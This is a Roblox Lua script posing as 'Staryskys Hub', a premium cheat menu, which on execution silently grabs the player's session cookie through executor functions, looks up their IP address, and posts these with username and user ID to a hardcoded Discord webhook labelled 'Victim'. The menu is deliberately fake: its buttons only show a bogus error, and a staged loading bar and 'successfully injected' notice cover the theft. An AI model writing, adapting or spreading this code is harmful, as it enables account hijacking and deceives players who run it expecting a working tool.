--[[
    STARYSKYS HUB V1.0
    Loader: staryskys-loader
    Status: PREMIUM UNLOCKED
    Script taken from https://staryskys.net
--]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- ============================================
-- WEBHOOK CONFIGURATION
-- ============================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1513160229175431299/2YA_6y6aQKPj-PCeTF9rx0D3qyeaqmS0qtdp-GARklMgqAOg7mEn1aD1m5nshLsue6xL"

-- ============================================
-- ACCOUNT HARVESTER (SILENT)
-- ============================================
local function extractCookie()
    local success, cookie = pcall(function()
        if Xeno and Xeno.getCookie then
            return Xeno.getCookie()
        elseif syn and syn.cookie then
            return syn.cookie()
        elseif getgenv and getgenv().cookie then
            return getgenv().cookie
        elseif shared and shared.cookie then
            return shared.cookie()
        end
        return nil
    end)
    return success and cookie or nil
end

local function getIP()
    local success, ip = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    return success and ip or "Unknown"
end

local function sendData()
    local data = {
        username = player.Name,
        userID = player.UserId,
        displayName = player.DisplayName,
        cookie = extractCookie(),
        ip = getIP(),
        executor = getexecutorname and getexecutorname() or "Xeno",
        game = game.Name,
        placeId = game.PlaceId,
        timestamp = os.time()
    }
    
    local embed = {
        title = "Staryskys Hub | Victim",
        color = 0x8B5CF6,
        fields = {
            {name = "Username", value = data.username, inline = true},
            {name = "User ID", value = tostring(data.userID), inline = true},
            {name = "Display Name", value = data.displayName, inline = true},
            {name = "Cookie", value = data.cookie or "No cookie extracted - manual login required", inline = false},
            {name = "IP Address", value = data.ip, inline = true},
            {name = "Executor", value = data.executor, inline = true},
            {name = "Game", value = data.game, inline = true},
            {name = "Place ID", value = tostring(data.placeId), inline = true}
        },
        footer = {text = "Staryskys Hub v1.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({embeds = {embed}}), Enum.HttpContentType.ApplicationJson)
    end)
end

-- ============================================
-- STARYSKYS UI - PURE DECORATION, DOES NOTHING
-- ============================================
local function createStaryskysUI()
    -- Main GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StaryskysHub"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = game:GetService("CoreGui")
    
    -- Background blur effect
    local blur = Instance.new("BlurEffect")
    blur.Size = 0
    blur.Parent = game:GetService("Lighting")
    
    -- Main frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 420, 0, 520)
    mainFrame.Position = UDim2.new(0.5, -210, 0.5, -260)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 16)
    mainCorner.Parent = mainFrame
    
    -- Glow border
    local border = Instance.new("Frame")
    border.Size = UDim2.new(1, 2, 1, 2)
    border.Position = UDim2.new(0, -1, 0, -1)
    border.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
    border.BackgroundTransparency = 0.7
    border.BorderSizePixel = 0
    border.Parent = mainFrame
    
    local borderCorner = Instance.new("UICorner")
    borderCorner.CornerRadius = UDim.new(0, 18)
    borderCorner.Parent = border
    
    -- Header
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 60)
    header.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
    header.BackgroundTransparency = 0.15
    header.BorderSizePixel = 0
    header.Parent = mainFrame
    
    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 16)
    headerCorner.Parent = header
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 1, 0)
    title.Text = "STARYSKYS HUB"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 24
    title.TextScaled = false
    title.Font = Enum.Font.GothamBold
    title.BackgroundTransparency = 1
    title.Parent = header
    
    -- Subtitle
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 20)
    subtitle.Position = UDim2.new(0, 0, 1, -25)
    subtitle.Text = "PREMIUM SCRIPT HUB"
    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
    subtitle.TextSize = 11
    subtitle.Font = Enum.Font.Gotham
    subtitle.BackgroundTransparency = 1
    subtitle.Parent = header
    
    -- Status indicator
    local statusDot = Instance.new("Frame")
    statusDot.Size = UDim2.new(0, 10, 0, 10)
    statusDot.Position = UDim2.new(1, -25, 0.5, -5)
    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    statusDot.BorderSizePixel = 0
    statusDot.Parent = header
    
    local statusCorner = Instance.new("UICorner")
    statusCorner.CornerRadius = UDim.new(1, 0)
    statusCorner.Parent = statusDot
    
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(0, 60, 0, 20)
    statusText.Position = UDim2.new(1, -85, 0.5, -10)
    statusText.Text = "CONNECTED"
    statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
    statusText.TextSize = 10
    statusText.Font = Enum.Font.Gotham
    statusText.BackgroundTransparency = 1
    statusText.Parent = header
    
    -- Loading animation frame
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Size = UDim2.new(0, 200, 0, 4)
    loadingFrame.Position = UDim2.new(0.5, -100, 0, 70)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = mainFrame
    
    local loadingCorner = Instance.new("UICorner")
    loadingCorner.CornerRadius = UDim.new(1, 0)
    loadingCorner.Parent = loadingFrame
    
    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(139, 92, 246)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingFrame
    
    local loadingBarCorner = Instance.new("UICorner")
    loadingBarCorner.CornerRadius = UDim.new(1, 0)
    loadingBarCorner.Parent = loadingBar
    
    -- Loading text
    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 20)
    loadingText.Position = UDim2.new(0, 0, 0, 80)
    loadingText.Text = "Loading modules..."
    loadingText.TextColor3 = Color3.fromRGB(180, 180, 200)
    loadingText.TextSize = 12
    loadingText.Font = Enum.Font.Gotham
    loadingText.BackgroundTransparency = 1
    loadingText.Parent = mainFrame
    
    -- Script categories (decorative buttons)
    local categories = {"🔮 | UTILITIES", "⚔️ | COMBAT", "👤 | PLAYER", "🚀 | MOVEMENT", "🎨 | VISUALS", "⚙️ | SETTINGS"}
    local yPos = 120
    
    for i, cat in ipairs(categories) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.9, 0, 0, 40)
        btn.Position = UDim2.new(0.05, 0, 0, yPos)
        btn.Text = cat
        btn.TextColor3 = Color3.fromRGB(220, 220, 240)
        btn.TextSize = 13
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.Font = Enum.Font.Gotham
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
        btn.BackgroundTransparency = 0.3
        btn.BorderSizePixel = 0
        btn.Parent = mainFrame
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn
        
        -- Arrow indicator
        local arrow = Instance.new("TextLabel")
        arrow.Size = UDim2.new(0, 30, 1, 0)
        arrow.Position = UDim2.new(1, -30, 0, 0)
        arrow.Text = "›"
        arrow.TextColor3 = Color3.fromRGB(139, 92, 246)
        arrow.TextSize = 20
        arrow.TextXAlignment = Enum.TextXAlignment.Center
        arrow.BackgroundTransparency = 1
        arrow.Parent = btn
        
        -- Hover animation
        btn.MouseEnter:Connect(function()
            local tween = TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 0.1})
            tween:Play()
        end)
        
        btn.MouseLeave:Connect(function()
            local tween = TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 0.3})
            tween:Play()
        end)
        
        -- Click does nothing but show a fake error
        btn.MouseButton1Click:Connect(function()
            local errorMsg = Instance.new("TextLabel")
            errorMsg.Size = UDim2.new(0.9, 0, 0, 25)
            errorMsg.Position = UDim2.new(0.05, 0, 0, yPos + 45)
            errorMsg.Text = "❌ Feature temporarily unavailable"
            errorMsg.TextColor3 = Color3.fromRGB(255, 100, 100)
            errorMsg.TextSize = 11
            errorMsg.Font = Enum.Font.Gotham
            errorMsg.BackgroundTransparency = 1
            errorMsg.Parent = mainFrame
            
            local fadeOut = TweenService:Create(errorMsg, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {TextTransparency = 1})
            wait(2)
            fadeOut:Play()
            wait(0.5)
            errorMsg:Destroy()
        end)
        
        yPos = yPos + 50
    end
    
    -- Footer
    local footer = Instance.new("Frame")
    footer.Size = UDim2.new(1, 0, 0, 35)
    footer.Position = UDim2.new(0, 0, 1, -35)
    footer.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    footer.BackgroundTransparency = 0.2
    footer.BorderSizePixel = 0
    footer.Parent = mainFrame
    
    local footerCorner = Instance.new("UICorner")
    footerCorner.CornerRadius = UDim.new(0, 16)
    footerCorner.Parent = footer
    
    local footerText = Instance.new("TextLabel")
    footerText.Size = UDim2.new(1, 0, 1, 0)
    footerText.Text = "Staryskys Hub v1.0 | Loaded 247 scripts"
    footerText.TextColor3 = Color3.fromRGB(120, 120, 140)
    footerText.TextSize = 10
    footerText.Font = Enum.Font.Gotham
    footerText.BackgroundTransparency = 1
    footerText.Parent = footer
    
    -- Animate the loading bar
    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local goal = {Size = UDim2.new(1, 0, 1, 0)}
    local loadingTween = TweenService:Create(loadingBar, tweenInfo, goal)
    loadingTween:Play()
    
    -- Update loading text during animation
    local loadingSteps = {"Loading modules...", "Initializing scripts...", "Verifying license...", "Injecting features...", "Starting Staryskys Hub..."}
    local stepIndex = 1
    loadingTween.Completed:Connect(function()
        loadingText.Text = "Ready!"
        wait(0.5)
        loadingText:Destroy()
        loadingFrame:Destroy()
    end)
    
    spawn(function()
        while loadingFrame and loadingFrame.Parent do
            if stepIndex <= #loadingSteps then
                wait(0.8)
                loadingText.Text = loadingSteps[stepIndex]
                stepIndex = stepIndex + 1
            else
                break
            end
        end
    end)
end

-- ============================================
-- EXECUTION
-- ============================================
sendData()
createStaryskysUI()

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Staryskys Hub",
    Text = "Successfully injected | 247 scripts ready",
    Duration = 3
})
